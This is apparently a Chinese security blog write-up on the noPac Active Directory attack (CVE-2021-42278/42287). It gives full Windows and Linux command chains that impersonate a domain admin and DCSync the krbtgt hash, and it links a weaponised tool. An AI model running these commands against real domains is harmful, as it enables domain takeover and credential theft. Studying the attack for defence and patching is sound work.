---
title: 「sAMAccountName spoofing」一个账户沦陷域控学习
tags: 域渗透
---

这两天一直跟着大家研究log4j2，又能给我们这些脚本小子吃3年饭了。（JB小子狂喜）

### 0x00 背景

漏洞编号为：`CVE-2021-42278`和`CVE-2021-42287`，可以看到影响还是非常广的

![image-20211212142928196](https://images-1258433570.cos.ap-beijing.myqcloud.com/images/20211212142929.png)

`CVE-2021-42278`，机器账户的名字一般来说应该以`$`结尾，但AD没有对域内机器账户名做验证。

`CVE-2021-42287`，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在`TGS_REP`阶段，这个账户不存在的时候，DC会使用自己的密钥加密`TGS Ticket`，提供一个属于该账户的`PAC`，然后我们就得到了一个高权限ST。



有人也叫这个漏洞为：**sAMAccountName spoofing**，不过看完过程也确实很符合这个名字。

### 0x01 利用

​	需要对属性`sAMAccountName` and `servicePrincipalName`，具有写权限。说到机器账户，就可以利用域内默认的MAQ特性，默认允许域账户创建10个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。

​	查看MAQ是否有限制，查看LDAP中的`ms-ds-machineaccountquota`属性即可。

攻击流程：

1. 创建一个机器账户，这在之前的文章都有所提及，使用impacket的`addcomputer.py`或是`powermad`

   `addcomputer.py`是利用`SAMR协议`创建机器账户，这个方法所创建的机器账户没有SPN，所以可以不用清除

2. 清除机器账户的`servicePrincipalName`属性

3. 将机器账户的`sAMAccountName`，更改为DC的机器账户名字，注意后缀不带$

4. 为机器账户请求TGT

5. 将机器账户的`sAMAccountName`更改为其他名字，不与步骤3重复即可

6. 通过S4U2self协议向DC请求ST

7. DCsync

**通过用户账户利用的话，需要对用户账户有`GenericAll`的权限还有用户的凭据**

实际上只操作`sAMAccountName`属性，有`GenericWrite`或是`WriteProperty`，也可以达到相同效果

如果可以跨域创建机器账户或是有写权限的话，也可以利用此攻击进行跨域攻击。

#### Windows命令

```cmd
# 0. create a computer account
$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose

# 1. clear its SPNs
Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose

# 2. rename the computer (computer -> DC)
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose

# 3. obtain a TGT
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

# 4. reset the computer name
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]

# 6. DCSync
(mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt 
```

或是Windows下的武器化工具：https://github.com/cube0x0/noPac

#### Linux命令

```shell
# 0. create a computer account
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'

# 1. clear its SPNs
addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'

# 3. obtain a TGT
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

# 4. reset the computer name
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'

# 6. DCSync by presenting the service ticket
KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
```

### 0x02 总结

​	还记得之前我所发的相关文章吗，仔细思考，这个漏洞只需更改LDAP中的两个属性，而LDAP默认是协商签名，这意味着我们又可以通过NTLM relay的方式来达到这一效果，而触发Net-NTLM的方式又多种多样，这样将更加灵活，等待impacket，或许马上就会有这个利用了（JB小子再次狂喜）

### 参考

https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e

https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041

https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing

https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html